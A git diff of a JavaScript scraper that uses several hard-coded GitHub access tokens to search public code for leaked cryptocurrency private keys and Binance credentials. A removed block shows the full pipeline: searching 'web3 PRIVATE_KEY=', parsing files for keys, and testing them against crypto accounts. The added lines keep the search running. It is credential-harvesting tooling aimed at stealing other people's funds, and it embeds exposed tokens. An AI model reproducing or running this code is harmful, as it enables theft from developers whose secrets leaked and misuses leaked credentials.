@@ -39,7 +39,7 @@ Sentry.init({
 
 
 
-let jon = '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'
+let jon = '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'
 let user32 = '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'
 let eaglesfan = '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'
 
@@ -49,7 +49,7 @@ let eaglesfan = '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'
 
 
 
-let ghAccounts = [  jon ]
+let ghAccounts = [ user32,  jon, ]
 let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
 let parser
 
@@ -334,8 +334,8 @@ const collectFiles = async (query, ghAccount, page) => {
   
   const code = await makeOctokitRequest(ghAccount.rest.search.code({
     q: query,
-    order: 'asc',
-    sort: 'indexed',
+    order: 'desc',
+    sort: 'best-match',
     per_page: 100,
     page
   }), ghAccount).catch(err => err)
@@ -491,25 +491,17 @@ const start =  async () => {
   })
 }
 
- const filePromiseChain = () => {
   
-}  
- const query = 'web3 PRIVATE_KEY='
- initGithubAccounts().then(accounts => {
+// const query = 'from binance import Client'
+// initGithubAccounts().then(accounts => {
 
-   const ghAccount = accounts[0].ghAccount
-   collectFiles(query, ghAccount, 1).then(res => {
-    return Promise.each(res, async file => {
-     const parser = await spawn(new Worker("./workers/parseFile"))
-     const result = await parser(file.content)
-     const privateKeys = result.privateKeys
-     console.log("got private keys", privateKeys)
-     if(privateKeys.length > 0) {
-        const privateKeyTester = await spawn(new Worker("./workers/testPrivateKeys.js"))
-        const cryptoAccounts = await privateKeyTester(privateKeys)
-        console.log("cryptoaccounts", cryptoAccounts)
-    }
-   })
-  })
- })
+//   const ghAccount = accounts[0].ghAccount
+//   collectFiles(query, ghAccount, 1).then(console.log)
+// })
 
+//lookForBinanceKeys()
+//startConsuming()
+initGithubAccounts().then(accounts => {
+  let ghAccount = accounts[0]
+  collectFiles(query, ghAccount, 1).then(console.log) 
+})
